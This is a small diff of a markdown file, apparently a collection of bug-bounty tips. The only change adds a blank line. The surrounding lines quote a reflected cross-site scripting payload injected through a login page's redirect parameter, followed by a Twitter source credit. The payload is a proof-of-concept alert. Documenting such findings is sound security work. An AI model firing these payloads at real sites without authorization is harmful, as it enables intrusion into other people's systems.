@@ -42,6 +42,7 @@
 https://target[.]com/bi-security-login/login.jsp?msi=false&redirect="><img/src/onerror%3dalert(document.domain)>
 ```
 ![img](https://pbs.twimg.com/media/Emox1wcXIAAabpt?format=png&name=900x900)
+
 **Source: https://twitter.com/HackerOn2Wheels/status/1326927875279380480?s=20**
 
 📅 10-Feb-2021
